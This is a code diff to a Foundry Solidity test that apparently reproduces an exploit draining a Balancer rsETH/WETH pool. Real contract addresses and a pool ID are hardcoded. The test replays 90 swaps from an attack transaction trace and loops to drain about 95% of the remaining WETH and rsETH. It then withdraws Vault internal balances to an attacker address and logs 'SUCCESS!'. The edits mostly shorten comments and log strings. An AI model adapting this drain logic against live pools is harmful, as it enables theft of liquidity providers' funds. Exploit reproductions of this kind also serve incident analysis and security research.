@@ -69,12 +69,10 @@ interface IWETH is IERC20 {
 
 contract BalancerRsEthWethPoolTest is Test {
     IBalancerVault constant VAULT = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
-
     IWETH constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
     bytes32 constant POOL_ID_RSETH = 0x58aadfb1afac0ad7fca1148f3cde6aedf5236b6d00000000000000000000067f;
     address constant rsETH_WETH_BPT = 0x58AAdFB1Afac0ad7fca1148f3cdE6aEDF5236B6D;
     address constant rsETH = 0xA1290d69c65A6Fe4DF752f95823fae25cB99e5A7;
-
     address constant ATTACKER = address(0xAa760D53541d8390074c61DEFeaba314675b8e3f);
 
     struct ExactSwapData {
@@ -114,7 +112,7 @@ contract BalancerRsEthWethPoolTest is Test {
             toInternalBalance: true  // Keep funds in Vault internal balance
         });
 
-        // Exact swaps from transaction trace - ALL 90 SWAPS (WITH BPT OUTPUT)
+        // swaps from transaction trace
         ExactSwapData[90] memory swaps;
 
         swaps[0] = ExactSwapData({ tokenIn: rsETH_WETH_BPT, tokenOut: rsETH, amount: 1176332457006284629565, expectedIn: 1201076805421509281395, indexIn: 0, indexOut: 1 });
@@ -243,7 +241,6 @@ contract BalancerRsEthWethPoolTest is Test {
         console.log("Total swaps:", swaps.length);
 
         // Continue draining the pool until almost empty
-        console.log("=== ADDITIONAL DRAINAGE SWAPS ===");
         (,uint256[] memory midBalances,) = VAULT.getPoolTokens(POOL_ID_RSETH);
         console.log("Pool state before drainage:");
         console.log("  rsETH:", midBalances[1]);
@@ -256,7 +253,7 @@ contract BalancerRsEthWethPoolTest is Test {
         while (midBalances[2] > 1e9) { // Keep draining until minimal
             (,midBalances,) = VAULT.getPoolTokens(POOL_ID_RSETH);
 
-            // Calculate amount to drain (95% of remaining WETH)
+            // Calculate amount
             uint256 wethToDrain = (midBalances[2] * 95) / 100;
             if (wethToDrain < 1e9) break;
 
@@ -282,7 +279,7 @@ contract BalancerRsEthWethPoolTest is Test {
         while (midBalances[1] > 1e9) { // Keep draining until minimal
             (,midBalances,) = VAULT.getPoolTokens(POOL_ID_RSETH);
 
-            // Calculate amount to drain (95% of remaining rsETH)
+            // Calculate amount
             uint256 rsethToDrain = (midBalances[1] * 95) / 100;
             if (rsethToDrain < 1e9) break;
 
@@ -307,7 +304,7 @@ contract BalancerRsEthWethPoolTest is Test {
         console.log("Additional drainage swaps:", additionalSwaps);
 
         // Check internal balances in Vault
-        console.log("=== VAULT (BEFORE WITHDRAWAL) ===");
+        console.log("=== VAULT BEFORE");
         IERC20[] memory internalTokens = new IERC20[](3);
         internalTokens[0] = IERC20(address(WETH));
         internalTokens[1] = IERC20(rsETH_WETH_BPT);
@@ -322,15 +319,13 @@ contract BalancerRsEthWethPoolTest is Test {
         console.log("Internal rsETH balance:", internalBalances[2] / 1e18, "ETH");
 
         // Check attacker balances BEFORE withdrawal
-        console.log("=== ATTACKER WALLET BALANCES (BEFORE WITHDRAWAL) ===");
+        console.log("=== ATTACKER BALANCE BEFORE");
         console.log("WETH in wallet:", WETH.balanceOf(ATTACKER) / 1e18, "ETH");
         console.log("BPT in wallet:", IERC20(rsETH_WETH_BPT).balanceOf(ATTACKER) / 1e18, "ETH");
         console.log("rsETH in wallet:", IERC20(rsETH).balanceOf(ATTACKER) / 1e18, "ETH");
 
         // Withdraw all internal balances if any
         if (internalBalances[0] > 0 || internalBalances[1] > 0 || internalBalances[2] > 0) {
-            console.log("=== EXECUTING WITHDRAWAL manageUserBalance ===");
-
             // Count non-zero balances
             uint256 opsCount = 0;
             if (internalBalances[0] > 0) opsCount++;
@@ -392,7 +387,7 @@ contract BalancerRsEthWethPoolTest is Test {
             console.log("BPT withdrawn:", internalBalances[1] / 1e18, "ETH");
             console.log("rsETH withdrawn:", internalBalances[2] / 1e18, "ETH");
 
-            console.log("Total value withdrawn (approx):", (internalBalances[0] + internalBalances[2]) / 1e18, "ETH");
+            console.log("Total value:", (internalBalances[0] + internalBalances[2]) / 1e18, "ETH");
         } else {
             console.log("No internal balances to withdraw");
         }
@@ -419,7 +414,7 @@ contract BalancerRsEthWethPoolTest is Test {
         console.log("WETH:", WETH.balanceOf(ATTACKER) / 1e18, "ETH");
         console.log("rsETH:", IERC20(rsETH).balanceOf(ATTACKER) / 1e18, "ETH");
 
-        console.log("Total swaps executed:", successCount + additionalSwaps);
+        console.log("Total swaps:", successCount + additionalSwaps);
         console.log("SUCCESS!");
     }
     
